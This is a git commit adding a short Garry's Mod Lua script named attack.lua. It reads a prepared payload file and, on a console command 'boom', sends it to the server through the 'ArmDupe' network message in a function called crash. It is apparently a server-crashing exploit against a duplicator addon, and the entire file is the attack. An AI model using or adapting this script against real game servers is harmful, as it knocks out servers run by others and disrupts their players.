db245141a9b9ac541bd709eb890cbe5caed87213
J. Gonzalez <gonzalezjo@users.noreply.github.com>
2018-07-09 16:34:47 -0400

    Add files via upload

---
+++ gmod/attack.lua
@@ -0,0 +1,20 @@
+-- J Gonzalez
+-- June 30, 2018
+-- attack.lua
+-- Licensed under the terms of the AGPLv3
+
+local f = file.Open('FinalOutput.txt', 'rb', 'DATA'); 
+local payload = f:Read(f:Size())
+local length = payload:len()
+
+print('Length: ' .. length)
+print('Size: ' .. f:Size())
+
+local function crash()
+  net.Start('ArmDupe')
+  net.WriteUInt(length, 32)
+  net.WriteData(payload, length)
+  net.SendToServer()
+end
+
+concommand.Add('boom', crash)
